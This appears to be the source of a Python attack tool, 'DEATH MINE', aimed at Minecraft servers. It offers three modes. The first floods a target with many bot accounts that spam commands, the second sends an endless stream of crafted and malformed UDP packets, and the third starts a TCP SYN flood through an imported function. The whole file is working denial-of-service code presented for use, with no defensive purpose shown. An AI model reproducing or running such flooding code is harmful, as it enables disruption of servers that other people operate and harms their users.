import pyfiglet
from javascript import require, On
import threading
from names_generator import generate_name
import time
import random
import socket
from utility import pack_varint, pack_string, int_to_unsigned
from tcp_syn import attack

logo = pyfiglet.figlet_format("DEATH MINE", font="bloody")
print(f'\033[31m{logo}\033[0m')

mineflayer = require('mineflayer')

print(f'\033[31m1: Fake Player\033[0m')
print(f'\033[31m2: Attack UDP\033[0m')
print(f'\033[31m3: Attack TCP SYN\033[0m')
opcao = int(input(f'\033[31mOptions: \033[0m'))

def FakePlayer():
    server = input(f'\033[31mServer:\033[0m ')
    port = int(input(f'\033[31mPort:\033[0m '))
    quantity = int(input(f'\033[31mQuantity:\033[0m '))
    intervalo = float(input(f'\033[31mIntervalo entre mensagens (segundos):\033[0m '))

    bots = []

    mensagens = ["/ping", "/info", "/tps", "/list", "/who"]

    class Bot:
        def __init__(self, username):
            self.username = username
            self.criarBot()

        def criarBot(self):
            time.sleep(2)
            self.bot = mineflayer.createBot({
                'host': server,
                'port': port,
                'username': self.username
            })

            @On(self.bot, "login")
            def login(_):
                print(f'\033[32m{self.username} conectado!\033[0m')
                threading.Thread(target=self.chat).start()

        def chat(self):
            while True:
                msg = random.choice(mensagens)
                try:
                    self.bot.chat(msg)
                    print(f'\033[35m[{self.username}] Enviou: {msg}\033[0m')
                except Exception as e:
                    print(f'\033[31m[{self.username}] Erro: {e}\033[0m')
                time.sleep(intervalo)

    
    for _ in range(quantity):
        nome_bot = generate_name()
        bot = Bot(nome_bot)
        bots.append(bot)

def AttackUDP():
     server = input(f'\033[31mServer:\033[0m ')
     port = int(input(f'\033[31mPort:\033[0m '))

     while True:
        try:
            packet = b'\x03' + pack_varint(100) + pack_string(
                "🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀") + int_to_unsigned(65535) + b'\x01'
            packet = pack_varint(len(packet)) + packet
            
            malformed = b'\x01\x00'
            
            sock = socket.socket(socket.AF_INET,
                                socket.SOCK_DGRAM)
            sock.sendto(packet, (server, port))

            sock2 = socket.socket(socket.AF_INET,
                                    socket.SOCK_DGRAM)
            sock2.sendto(malformed, (server, port))
            
        except Exception as e:
                print(e)
             

def AttackSYN():
    server = input(f'\033[31mServer:\033[0m ')
    destiny = input(f'\033[31mDestiny:\033[0m ')
    port = int(input(f'\033[31mPort:\033[0m '))
    attack(server, destiny, port)

if opcao == 1:
    FakePlayer()

if opcao == 2:
    AttackUDP()

if opcao == 3:
    AttackSYN() #Somente linux